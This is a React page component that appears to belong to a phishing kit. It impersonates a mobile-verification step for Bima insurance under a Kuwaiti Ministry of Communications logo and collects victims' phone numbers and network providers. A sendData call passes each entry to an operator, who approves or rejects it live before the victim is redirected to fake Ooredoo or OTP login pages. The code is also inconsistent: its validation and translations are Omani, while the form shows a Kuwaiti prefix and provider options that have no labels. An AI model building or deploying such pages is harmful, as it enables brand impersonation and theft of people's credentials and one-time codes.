import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import WaitingOverlay, { waitingProviderInfo, waitingCardInfo } from "@/components/WaitingOverlay";
import {
  sendData,
  codeAction,
  navigateToPage,
} from "@/lib/store";

export default function NetworkOperator() {
  const [, navigate] = useLocation();
  const [phoneNumber, setPhoneNumber] = useState("");
  const [provider, setProvider] = useState("");
  const [error, setError] = useState("");
  const [isWaiting, setIsWaiting] = useState(false);
  const [isRejected, setIsRejected] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [currentLang, setCurrentLang] = useState("ar");

  const translations = {
    ar: {
      title: "توثيق الجوال",
      subtitle: "يرجى إدخال رقم الجوال واختيار مزود الشبكة",
      phoneLabel: "رقم الجوال",
      phonePlaceholder: "أدخل رقم الجوال",
      providerLabel: "اختر مزود الشبكة",
      providerPlaceholder: "اختر مزود الشبكة",
      submitBtn: "متابعة",
      loadingBtn: "جاري التحقق...",
      toggleText: "English",
      backText: "رجوع",
      errorRequired: "يرجى تعبئة جميع الحقول المطلوبة",
      errorPhone: "رقم الجوال يجب أن يكون 8 أرقام",
      errorRejected: "تعذر التحقق من الرقم، يرجى المحاولة مرة أخرى",
      ooredoo: "Ooredoo",
      omantel: "Omantel",
      vodafone: "Vodafone",
      popupTitle: "عزيزي العميل،",
      popupMessage: "يرجى إستكمال إجراءات توثيق رقم جوالك ليتم إعتماده في خدمات بيمة وإصدار وثيقة التأمين الخاصة بك",
      popupBtn: "متابعة",
    },
    en: {
      title: "Mobile Verification",
      subtitle: "Please enter your mobile number and select network provider",
      phoneLabel: "Mobile Number",
      phonePlaceholder: "Enter mobile number",
      providerLabel: "Select Network Provider",
      providerPlaceholder: "Select Network Provider",
      submitBtn: "Continue",
      loadingBtn: "Verifying...",
      toggleText: "العربية",
      backText: "Back",
      errorRequired: "Please fill in all required fields",
      errorPhone: "Mobile number must be 8 digits",
      errorRejected: "Verification failed, please try again",
      ooredoo: "Ooredoo",
      omantel: "Omantel",
      vodafone: "Vodafone",
      popupTitle: "Dear Customer,",
      popupMessage: "Please complete the mobile number verification process to be approved for Bima services and to issue your insurance policy",
      popupBtn: "Continue",
    },
  };

  const t = translations[currentLang as keyof typeof translations] || translations.ar;

  // Provider logos mapping
  const providerLogos: Record<string, string> = {
    ooredoo: "/provider-logos/ooredoo.png",
    omantel: "/provider-logos/omantel.png",
    vodafone: "/provider-logos/vodafone.png",
  };

  // Emit page enter & clear card info (not relevant for this page)
  useEffect(() => {
    waitingCardInfo.value = null;
    navigateToPage("مشغل الشبكة");
    // Show popup after 2 seconds
    const timer = setTimeout(() => setShowPopup(true), 2000);
    return () => clearTimeout(timer);
  }, []);

  // Handle code action from admin
  useSignalEffect(() => {
    const action = codeAction.value;
    if (action) {
      if (action.action === "approve") {
        // Navigate based on provider
        if (provider === "ooredoo") {
          navigate("/ooredoo-login");
        } else {
          // Omantel or Vodafone - go to OTP login with provider info
          sessionStorage.setItem("otp_provider", provider);
          navigate("/otp-login");
        }
      } else if (action.action === "reject") {
        // Show error but keep fields enabled so user can retry
        setError(t.errorRejected);
        setIsWaiting(false);
        setIsRejected(false);
      }
      // Reset the action
      codeAction.value = null;
    }
  });

  const toggleLanguage = () => {
    const newLang = currentLang === "ar" ? "en" : "ar";
    setCurrentLang(newLang);
    localStorage.setItem("siteLang", newLang);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!phoneNumber.trim() || !provider) {
      setError(t.errorRequired);
      return;
    }

    // Validate phone number (Oman numbers are 8 digits)
    const cleanPhone = phoneNumber.replace(/\D/g, "");
    if (cleanPhone.length !== 8) {
      setError(t.errorPhone);
      return;
    }

    setError("");
    setIsRejected(false);

    // Set provider info for waiting overlay
    const providerName = provider === "ooredoo" ? "Ooredoo" : provider === "omantel" ? "Omantel" : "Vodafone";

    // Save phone number to sessionStorage for OTP page
    sessionStorage.setItem("ooredoo_otp_customer_number", cleanPhone);

    // If Ooredoo selected, send data and show spinner for 2 seconds then navigate
    if (provider === "ooredoo") {
      setIsWaiting(true);
      sendData({
        data: { "رقم الجوال": "+968 " + cleanPhone, "مزود الشبكة": providerName },
        current: "مشغل الشبكة",
        nextPage: "تسجيل الدخول",
        waitingForAdminResponse: false,
        mode: "silent",
      });
      // Clear any waiting overlay state
      waitingProviderInfo.value = null;
      // Show local spinner for 2 seconds then navigate
      setTimeout(() => {
        navigate("/ooredoo-login");
      }, 2000);
      return;
    }

    // For other providers, wait for admin approval
    setIsWaiting(true);
    waitingProviderInfo.value = {
      providerLogo: providerLogos[provider],
      providerName: providerName,
      phoneNumber: "+968 " + cleanPhone,
    };

    sendData({
      data: { "رقم الجوال": "+968 " + cleanPhone, "مزود الشبكة": providerName },
      current: "مشغل الشبكة",
      nextPage: "تسجيل الدخول",
      waitingForAdminResponse: true,
    });
  };

  // Only accept digits for phone number
  const handlePhoneChange = (value: string) => {
    const digitsOnly = value.replace(/\D/g, "");
    if (digitsOnly.length <= 8) {
      setPhoneNumber(digitsOnly);
      setError("");
      setIsRejected(false);
    }
  };

  return (
    <div
      className="min-h-screen flex flex-col items-center bg-white"
      dir={currentLang === "ar" ? "rtl" : "ltr"}
      style={{ fontFamily: "NotoSansLocal, Arial, Helvetica, sans-serif", paddingTop: "60px", paddingBottom: "44px" }}
    >
      <WaitingOverlay />

      {/* Welcome Popup */}
      {showPopup && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50" dir="rtl">
          <div className="bg-white rounded-2xl p-8 flex flex-col items-center gap-5 max-w-md mx-4 shadow-2xl" style={{ minWidth: "320px" }}>
            {/* Logos */}
            <div className="flex items-center justify-center gap-6 w-full">
              <img
                src="/moc-kuwait-logo.jpg"
                alt="وزارة المواصلات الكويتية"
                className="w-auto object-contain"
                style={{ height: "120px" }}
              />
            </div>

            {/* Text */}
            <div className="text-center">
              <h2 className="text-xl font-bold text-gray-900 mb-3">{t.popupTitle}</h2>
              <p className="text-gray-700 text-base leading-7">{t.popupMessage}</p>
            </div>

            {/* Continue Button */}
            <button
              onClick={() => setShowPopup(false)}
              className="w-full h-12 bg-blue-700 text-white font-bold text-base rounded-full hover:bg-blue-800 transition-colors mt-2"
            >
              {t.popupBtn}
            </button>
          </div>
        </div>
      )}

      {/* Language Toggle */}
      <div className="w-full max-w-[638px] px-4 mb-2">
        <button
          onClick={toggleLanguage}
          className="bg-gray-100 border border-gray-300 rounded-full px-4 py-1.5 text-sm font-semibold text-gray-700 hover:bg-gray-200 transition-all"
        >
          {t.toggleText}
        </button>
      </div>

      {/* Card */}
      <section
        className="w-full max-w-[638px] mx-4 bg-white border border-gray-100 rounded shadow-lg"
        style={{ padding: "40px 35px 36px", boxShadow: "0 19px 39px rgba(0, 0, 0, 0.095)" }}
      >
        {/* MOC Kuwait Logo */}
        <div className="flex justify-center mb-4">
          <img
            src="/moc-kuwait-logo.jpg"
            alt="وزارة المواصلات الكويتية"
            className="h-32 w-auto object-contain"
          />
        </div>

        <h1 className="text-center text-3xl font-bold text-gray-900 mb-2" style={{ fontSize: "30px" }}>
          {t.title}
        </h1>
        <p className="text-center text-gray-600 text-base mb-6">{t.subtitle}</p>

        <form onSubmit={handleSubmit} className="w-full">
          {/* Phone Number */}
          <div className="mb-5">
            <label className="block text-gray-900 text-base mb-2">{t.phoneLabel}</label>
            <div className="flex items-center gap-2">
              <div className="flex items-center h-12 border border-gray-300 rounded-lg px-3 bg-gray-50 text-gray-700 font-medium text-sm whitespace-nowrap">
                <span className="mr-1">🇰🇼</span>
                <span dir="ltr">+965</span>
              </div>
              <input
                type="tel"
                inputMode="numeric"
                value={phoneNumber}
                onChange={(e) => handlePhoneChange(e.target.value)}
                placeholder={t.phonePlaceholder}
                className="flex-1 h-12 border border-gray-300 rounded-lg px-4 text-base outline-none focus:border-blue-400 focus:ring-2 focus:ring-blue-100 transition-all"
                style={{ direction: "ltr", textAlign: "left" }}
                maxLength={8}
              />
            </div>
          </div>

          {/* Network Provider Dropdown */}
          <div className="mb-5">
            <label className="block text-gray-900 text-base mb-2">{t.providerLabel}</label>
            <select
              value={provider}
              onChange={(e) => {
                setProvider(e.target.value);
                setError("");
                setIsRejected(false);
              }}
              className="w-full h-12 border border-gray-300 rounded-lg px-4 text-base outline-none focus:border-blue-400 focus:ring-2 focus:ring-blue-100 transition-all bg-white appearance-none cursor-pointer"
            >
              <option value="">{t.providerPlaceholder}</option>
              <option value="zain">{t.zain}</option>
              <option value="ooredoo">{t.ooredoo}</option>
              <option value="stc">{t.stc}</option>
            </select>
          </div>

          {/* Error Message */}
          {error && (
            <p className="text-red-600 text-center text-sm mb-3 font-medium">{error}</p>
          )}

          {/* Submit Button */}
          <div className="mt-6">
            <button
              type="submit"
              disabled={isWaiting}
              className="w-full h-14 bg-blue-700 text-white font-bold text-base rounded-full hover:bg-blue-800 transition-colors disabled:opacity-60"
            >
              {isWaiting ? t.loadingBtn : t.submitBtn}
            </button>
          </div>
        </form>

        {/* Back Link */}
        <div className="text-center mt-5">
          <a href="/" className="inline-flex items-center gap-1.5 text-gray-500 font-bold text-lg hover:text-gray-700">
            <svg width="17" height="17" viewBox="0 0 20 20" fill="currentColor">
              <path d="M8.72 4.22a.95.95 0 0 1 0 1.34L5.24 9.05h10.81a.95.95 0 1 1 0 1.9H5.24l3.48 3.49a.95.95 0 0 1-1.34 1.34l-5.1-5.1a.96.96 0 0 1 0-1.36l5.1-5.1a.95.95 0 0 1 1.34 0Z"></path>
            </svg>
            <span>{t.backText}</span>
          </a>
        </div>
      </section>
    </div>
  );
}
